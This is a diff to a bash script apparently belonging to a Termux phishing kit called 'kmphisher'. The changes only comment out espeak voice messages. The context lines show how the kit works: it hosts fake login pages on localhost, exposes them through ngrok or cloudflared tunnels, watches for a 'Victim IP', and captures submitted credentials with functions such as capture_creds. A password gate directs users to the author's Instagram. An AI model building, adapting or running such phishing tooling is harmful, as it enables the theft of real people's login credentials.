@@ -747,7 +747,7 @@ install_cloudflared() {
 		if [[ ! -e "/system/bin/adb"  ]]; then
 		play-audio /data/data/com.termux/files/home/kmphisher/.misc/Clinstall.wav &> /dev/null;
 		else
-		espeak -s 118 'cloudflared has started installing'&> /dev/null;
+		#espeak -s 118 'cloudflared has started installing'&> /dev/null;
 		fi 
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
@@ -821,7 +821,7 @@ setup_site() {
 pass_for() {
 echo ""
 echo -n -e $K "Enter password to use this script : ${LG} "$w
-espeak -s 115 "enter password to use this script "
+#espeak -s 115 "enter password to use this script "
 read -s VALUE
 
 TEST=`echo -n $VALUE`
@@ -838,7 +838,7 @@ echo -e $g"[✓] You are granted to use this script"$wf
 if [[ ! -e "/system/bin/adb"  ]]; then
 play-audio /data/data/com.termux/files/home/kmphisher/.misc/Gran.wav &> /dev/null;
 else
-espeak -s 118 'you ate granted to use this script ' &> /dev/null;
+#espeak -s 118 'you ate granted to use this script ' &> /dev/null;
 fi
 sleep 2.4
 else
@@ -847,7 +847,7 @@ echo ""
 echo -e $G"[-] checking password.....!"$w
 sleep 3
 echo -e $r"[X] Password is wrong! "$fi
-espeak -s 115 "sorry it is wrong password if need contact me on instagram"
+#espeak -s 115 "sorry it is wrong password if need contact me on instagram"
 echo ""
 echo -e $r"[x] you can't use this tool "
 echo ""
@@ -911,7 +911,7 @@ capture_data() {
 	
 	while true; do
 		if [[ -e ".server/www/ip.txt" ]]; then 
-		espeak -s 118 "ip found"
+		#espeak -s 118 "ip found"
 		echo -e "\n\n${LG}[${GL}-${LG}]${P} Victim IP Found !"
 			capture_ip
 			rm -rf .server/www/ip.txt
@@ -921,7 +921,7 @@ capture_data() {
 			if [[ ! -e "/system/bin/adb"  ]]; then
 			play-audio /data/data/com.termux/files/home/kmphisher/.misc/misc3.mp3 &> /dev/null;
 			else
-			espeak -s 118 'Hey! Victim has found... come here' &> /dev/null; 
+			#espeak -s 118 'Hey! Victim has found... come here' &> /dev/null; 
 			fi
 			echo -e "\n\n${LG}[${GL}-${LG}]${P} Login info Found !!"
 			capture_creds
@@ -939,7 +939,7 @@ start_ngrok() {
 	if [[ ! -e "/system/bin/adb"  ]]; then
 	play-audio /data/data/com.termux/files/home/kmphisher/.misc/ngrok.wav &> /dev/null;
 	else
-	espeak -s 118 'ngrok has been started' &> /dev/null;
+	#espeak -s 118 'ngrok has been started' &> /dev/null;
 	fi
     if [[ `command -v termux-chroot` ]]; then
         sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
@@ -968,7 +968,7 @@ start_cloudflared() {
         if [[ ! -e "/system/bin/adb"  ]]; then
         play-audio /data/data/com.termux/files/home/kmphisher/.misc/cloud.wav &> /dev/null;
         else
-        espeak -s 118 'cloudflared has been started'&> /dev/null;
+        #espeak -s 118 'cloudflared has been started'&> /dev/null;
         fi
     if [[ `command -v termux-chroot` ]]; then
                 sleep 2 && termux-chroot cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
@@ -993,7 +993,7 @@ start_localhost() {
 	if [[ ! -e "/system/bin/adb"  ]]; then
 	play-audio /data/data/com.termux/files/home/kmphisher/.misc/lhoat.wav &> /dev/null;
 	else
-	espeak -s 118 'local host has been started' &> /dev/null; 
+	#espeak -s 118 'local host has been started' &> /dev/null; 
 	fi
 	{ sleep 1; clear; banner_small; }
 	echo -e "\n${LG}[${GL}-${LG}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
